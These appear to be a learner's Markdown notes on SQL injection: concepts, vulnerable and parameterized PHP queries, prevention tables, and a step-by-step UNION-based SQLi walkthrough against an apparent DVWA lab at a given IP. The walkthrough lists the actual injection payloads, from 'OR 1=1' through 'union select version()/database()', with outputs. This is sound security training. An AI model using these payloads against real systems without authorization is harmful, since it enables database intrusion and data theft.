# Website login scenario

![alt text](image-1.png)


# SQL Injection (SQLi)

SQL Injection is a vulnerability where attacker-controlled input changes a database query.

It happens when applications place user input directly into SQL commands without proper validation.

---

# Basic Concept

Vulnerable query:

```sql id="jlwmq1"
SELECT * FROM users
WHERE username = 'admin'
AND password = 'pass';
```

If user input is inserted unsafely, the query logic can change.

---

# Simple Example

Suppose login form:

```text id="jlwmq2"
Username: admin
Password: anything
```

Application builds:

```sql id="jlwmq3"
SELECT * FROM users
WHERE username='admin'
AND password='anything';
```

---

# Vulnerable Pattern

```php id="jlwmq4"
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
```

Unsafe because user controls query structure.

---

# Common SQLi Types

| Type                  | Description                    |
| --------------------- | ------------------------------ |
| Authentication Bypass | Login without password         |
| UNION-based           | Combine query results          |
| Error-based           | Database errors reveal info    |
| Blind SQLi            | Infer data via responses       |
| Time-based            | Use delays to detect injection |

---

# Example Safe Lab Payloads

In training environments, testers often use harmless payloads like:

```sql id="jlwmq5"
' OR '1'='1
```

or:

```sql id="jlwmq6"
1'--
```

These demonstrate how unsafe concatenation changes query logic.

---

# Example

Original query:

```sql id="jlwmq7"
SELECT * FROM users
WHERE username='admin'
AND password='test';
```

Injected input changes it to:

```sql id="jlwmq8"
SELECT * FROM users
WHERE username='admin'
AND password='' OR '1'='1';
```

Condition becomes always true.

---

# Common SQLi Locations

| Input Location | Example           |
| -------------- | ----------------- |
| Login forms    | username/password |
| Search bars    | `?q=test`         |
| URL parameters | `?id=1`           |
| Cookies        | session values    |
| HTTP headers   | User-Agent        |

---

# Signs of SQLi

| Symptom                 | Example       |
| ----------------------- | ------------- |
| SQL errors              | syntax error  |
| Different page behavior | login bypass  |
| Delayed responses       | time-based    |
| Unexpected data         | UNION results |

---

# Common Databases

| DBMS       | Example         |
| ---------- | --------------- |
| MySQL      | `LIMIT`         |
| PostgreSQL | `RETURNING`     |
| MSSQL      | `WAITFOR DELAY` |
| Oracle     | `DUAL`          |

---

# Prevention

| Protection            | Purpose                    |
| --------------------- | -------------------------- |
| Prepared Statements   | Separate code/data         |
| Parameterized Queries | Prevent query manipulation |
| ORM Frameworks        | Safer DB handling          |
| Input Validation      | Restrict input             |
| Least Privilege       | Reduce DB access           |

---

# Safe Example (Parameterized Query)

```php id="jlwmq9"
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE id = ?"
);
$stmt->execute([$id]);
```

User input is treated as data only.

---

# Real-Life Analogy

| Concept       | Analogy                                 |
| ------------- | --------------------------------------- |
| SQL Query     | Restaurant order                        |
| User Input    | Customer request                        |
| SQL Injection | Customer rewriting kitchen instructions |

---

# Related Vulnerabilities

| Vulnerability     | Similarity           |
| ----------------- | -------------------- |
| XSS               | Injects JavaScript   |
| Command Injection | Injects OS commands  |
| LDAP Injection    | Injects LDAP queries |
| NoSQL Injection   | Injects NoSQL syntax |



---------------------------------------------------------
# SQL Injection Notes – UNION Based SQLi Lab

Target Example:

```text
http://20.251.155.53:8080/vulnerabilities/sqli/?id=2&Submit=Submit#
```

Parameter:

```text
id
```

---

# 1. What is SQL Injection?

SQL Injection (SQLi) happens when user input is inserted into an SQL query without proper validation or parameterized queries.

An attacker can manipulate the SQL query and:

* bypass login
* read database data
* dump tables
* modify records
* sometimes gain server access

---

# 2. Vulnerable Query Example

Backend query may look like:

```sql
SELECT first_name, last_name
FROM users
WHERE user_id = '$id';
```

If input is not sanitized, attacker-controlled SQL becomes part of the query.

---

# 3. Detecting SQL Injection

## Normal Request

```text
?id=2
```

Server query:

```sql
SELECT first_name,last_name
FROM users
WHERE user_id='2';
```

---

## Testing with Quote

Payload:

```text
'
```

URL:

```text
?id='
```

Result:

```text
You have an error in your SQL syntax
```

This indicates:

* input is reflected into SQL query
* quote breaks query syntax
* parameter is likely injectable

---

# 4. Error-Based SQLi Detection

## Payload

```sql
'
```

Generated query becomes:

```sql
SELECT first_name,last_name
FROM users
WHERE user_id=''';
```

This creates invalid SQL syntax.

---

# 5. Finding Number of Columns

UNION attacks require:

* same number of columns
* compatible data types

---

## ORDER BY Method

Payload:

```sql
' order by 1 -- -
```

Then:

```sql
' order by 2 -- -
```

Then:

```sql
' order by 3 -- -
```

---

## Observation

When using:

```sql
' order by 3 -- -
```

Error:

```text
Unknown column '3' in 'ORDER BY'
```

Meaning:

* query has only 2 columns

---

# 6. Why ORDER BY Works

Original query:

```sql
SELECT col1,col2
FROM table
WHERE id='2'
ORDER BY 3;
```

Database tries to sort using column 3.

But only 2 columns exist.

So:

```text
Unknown column '3'
```

---

# 7. UNION SELECT Injection

Once column count is known:

```sql
' union select 1,2 -- -
```

---

## Purpose

Checks:

* UNION injection works
* which columns are reflected in response

---

## Query Becomes

```sql
SELECT first_name,last_name
FROM users
WHERE user_id=''

UNION

SELECT 1,2 -- -
```

---

# 8. Identifying Reflected Columns

If page displays:

```text
1
2
```

Then both columns are visible.

This helps know where extracted data will appear.

---

# 9. Extracting Database Version

Payload:

```sql
' union select version(),2 -- -
```

---

## Purpose

Gets:

* MySQL/MariaDB version

---

## Query

```sql
SELECT first_name,last_name
FROM users
WHERE user_id=''

UNION

SELECT version(),2 -- -
```

---

## Example Output

```text
10.4.32-MariaDB
```

---

# 10. Extracting Current Database Name

Payload:

```sql
' union select database(),2 -- -
```

---

## Purpose

Shows currently selected database.

---

## Example Output

```text
dvwa
```

---

# 11. SQLi Attack Flow

```text
1. Detect injection
        ↓
2. Trigger SQL error
        ↓
3. Find column count
        ↓
4. Test UNION SELECT
        ↓
5. Identify visible columns
        ↓
6. Extract DB info
        ↓
7. Enumerate tables
        ↓
8. Dump data
```

---

# 12. Common SQLi Functions

| Function      | Purpose                        |
| ------------- | ------------------------------ |
| `version()`   | DB version                     |
| `database()`  | Current DB                     |
| `user()`      | Current DB user                |
| `@@hostname`  | DB host                        |
| `load_file()` | Read server files (if allowed) |

---

# 13. SQL Comment Syntax

Used to ignore remaining query part.

| Syntax  | Meaning       |
| ------- | ------------- |
| `-- -`  | MySQL comment |
| `#`     | MySQL comment |
| `/* */` | Block comment |

---

# 14. UNION SQLi Requirements

For UNION to work:

| Requirement       | Description                   |
| ----------------- | ----------------------------- |
| Same column count | Must match original query     |
| Compatible types  | String/int compatibility      |
| Visible output    | At least one reflected column |

---

# 15. Visual Query Flow

## Original Query

```sql
SELECT first_name,last_name
FROM users
WHERE id='2';
```

---

## Injected Query

```sql
SELECT first_name,last_name
FROM users
WHERE id=''

UNION

SELECT database(),2 -- -
```

---

# 16. Indicators of SQL Injection

| Indicator                | Meaning                     |
| ------------------------ | --------------------------- |
| SQL syntax errors        | Unsanitized input           |
| Different page responses | Query manipulation possible |
| UNION works              | Data extraction possible    |
| Boolean changes          | Blind SQLi possible         |

---

# 17. Types of SQL Injection

| Type          | Description          |
| ------------- | -------------------- |
| Error-Based   | Uses DB errors       |
| UNION-Based   | Uses UNION SELECT    |
| Boolean-Based | True/false responses |
| Time-Based    | Delays response      |
| Out-of-Band   | External interaction |

---

# 18. Prevention Methods

## Use Prepared Statements

Safe example:

```php
$stmt = $conn->prepare(
  "SELECT first_name,last_name
   FROM users
   WHERE user_id=?"
);
```

---

## Other Protections

| Protection              | Purpose                     |
| ----------------------- | --------------------------- |
| Parameterized queries   | Prevent injection           |
| Input validation        | Restrict payloads           |
| Least privilege DB user | Limit damage                |
| Hide SQL errors         | Prevent information leakage |
| WAF                     | Detect/block attacks        |

---

# 19. Key Learning Summary

| Step         | Payload                            |
| ------------ | ---------------------------------- |
| Detect error | `'`                                |
| Find columns | `' order by 1,2,3 -- -`            |
| Verify UNION | `' union select 1,2 -- -`          |
| Get version  | `' union select version(),2 -- -`  |
| Get DB name  | `' union select database(),2 -- -` |

---

# 20. Important Note

Practice only in:

* labs
* CTFs
* intentionally vulnerable apps like Damn Vulnerable Web Application
* systems you own or are authorized to test

Unauthorized SQL injection testing is illegal.
